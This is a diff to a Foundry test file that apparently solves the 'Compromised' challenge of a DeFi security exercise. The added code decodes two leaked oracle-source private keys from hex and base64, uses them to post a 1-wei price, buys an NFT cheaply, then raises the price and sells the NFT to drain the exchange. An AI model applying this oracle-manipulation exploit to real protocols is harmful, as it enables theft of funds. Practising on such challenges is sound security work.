@@ -20,14 +20,17 @@ contract CompromisedChallenge is Test {
     uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
     uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;
 
-
     address[] sources = [
         0x188Ea627E3531Db590e6f1D71ED83628d1933088,
         0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
         0xab3600bF153A316dE44827e2473056d56B774a40
     ];
     string[] symbols = ["DVNFT", "DVNFT", "DVNFT"];
-    uint256[] prices = [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE];
+    uint256[] prices = [
+        INITIAL_NFT_PRICE,
+        INITIAL_NFT_PRICE,
+        INITIAL_NFT_PRICE
+    ];
 
     TrustfulOracle oracle;
     Exchange exchange;
@@ -50,10 +53,13 @@ contract CompromisedChallenge is Test {
         vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
 
         // Deploy the oracle and setup the trusted sources with initial prices
-        oracle = (new TrustfulOracleInitializer(sources, symbols, prices)).oracle();
+        oracle = (new TrustfulOracleInitializer(sources, symbols, prices))
+            .oracle();
 
         // Deploy the exchange and get an instance to the associated ERC721 token
-        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(address(oracle));
+        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(
+            address(oracle)
+        );
         nft = exchange.token();
 
         vm.stopPrank();
@@ -75,7 +81,45 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+        // 4d 48 67 33 5a 44 45 31 59 6d 4a 68 4d 6a 5a 6a 4e 54 49 7a 4e 6a 67 7a 59 6d 5a 6a 4d 32 52 6a 4e 32 4e 6b 59 7a 56 6b 4d 57 49 34 59 54 49 33 4e 44 51 30 4e 44 63 31 4f 54 64 6a 5a 6a 52 6b 59 54 45 33 4d 44 56 6a 5a 6a 5a 6a 4f 54 6b 7a 4d 44 59 7a 4e 7a 51 30 -> MHg3ZDE1YmJhMjZjNTIzNjgzYmZjM2RjN2NkYzVkMWI4YTI3NDQ0NDc1OTdjZjRkYTE3MDVjZjZjOTkzMDYzNzQ0 -> 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744 (private key)
+        address compromisedOracleSource1 = vm.addr(
+            0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744
+        );
+
+        // 4d 48 67 32 4f 47 4a 6b 4d 44 49 77 59 57 51 78 4f 44 5a 69 4e 6a 51 33 59 54 59 35 4d 57 4d 32 59 54 56 6a 4d 47 4d 78 4e 54 49 35 5a 6a 49 78 5a 57 4e 6b 4d 44 6c 6b 59 32 4d 30 4e 54 49 30 4d 54 51 77 4d 6d 46 6a 4e 6a 42 69 59 54 4d 33 4e 32 4d 30 4d 54 55 35 -> MHg2OGJkMDIwYWQxODZiNjQ3YTY5MWM2YTVjMGMxNTI5ZjIxZWNkMDlkY2M0NTI0MTQwMmFjNjBiYTM3N2M0MTU5 -> 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159 (private key)
+        address compromisedOracleSource2 = vm.addr(
+            0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159
+        );
+
+        // manipulate oracle to report 1 wei as median price
+        vm.prank(compromisedOracleSource1);
+        oracle.postPrice(symbols[0], 1);
+        vm.prank(compromisedOracleSource2);
+        oracle.postPrice(symbols[0], 1);
+
+        // buy 1 token for 1 wei
+        vm.prank(player);
+        uint256 tokenId = exchange.buyOne{value: 1}();
+
+        // reset oracle price back to default + 1 wei
+        vm.prank(compromisedOracleSource1);
+        oracle.postPrice(symbols[0], INITIAL_NFT_PRICE + 1);
+        vm.prank(compromisedOracleSource2);
+        oracle.postPrice(symbols[0], INITIAL_NFT_PRICE + 1);
+
+        // sell token thereby draining exchange
+        vm.startPrank(player);
+        nft.approve(address(exchange), tokenId);
+        exchange.sellOne(tokenId);
+        (bool success, ) = recovery.call{value: EXCHANGE_INITIAL_ETH_BALANCE}("");
+        require(success);
+        vm.stopPrank();
+
+        // reset oracle price to default
+        vm.prank(compromisedOracleSource1);
+        oracle.postPrice(symbols[0], INITIAL_NFT_PRICE);
+        vm.prank(compromisedOracleSource2);
+        oracle.postPrice(symbols[0], INITIAL_NFT_PRICE);
     }
 
     /**
